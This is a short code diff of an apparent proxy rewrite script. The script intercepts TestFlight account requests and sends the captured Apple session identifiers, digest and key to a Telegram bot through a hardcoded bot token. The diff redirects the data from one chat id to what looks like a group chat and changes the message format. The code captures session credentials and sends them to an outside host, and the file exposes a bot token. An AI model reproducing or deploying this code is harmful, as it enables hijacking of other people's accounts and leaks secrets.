@@ -3,7 +3,7 @@ Script Author: Yui Chy
 */
 
 const token = "7165345435:AAG3sG_icjcslKPJZFCIIdsityp_ArqOeCs";
-const chatId = "1730119425";
+const chatId = "-1002154303428";
 const reg1 = /^https:\/\/testflight\.apple\.com\/v3\/accounts\/(.*)\/apps$/;
 
 if (reg1.test($request.url)) {
@@ -38,12 +38,12 @@ if (reg1.test($request.url)) {
 }
 
 function sendToTelegram(data) {
-  const message = JSON.stringify({
+  const message = `/id ${JSON.stringify({
     session_id: data.session_id,
     session_digest: data.session_digest,
     request_id: data.request_id,
     key: data.key
-  });
+  })}`;
   const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
   const options = {
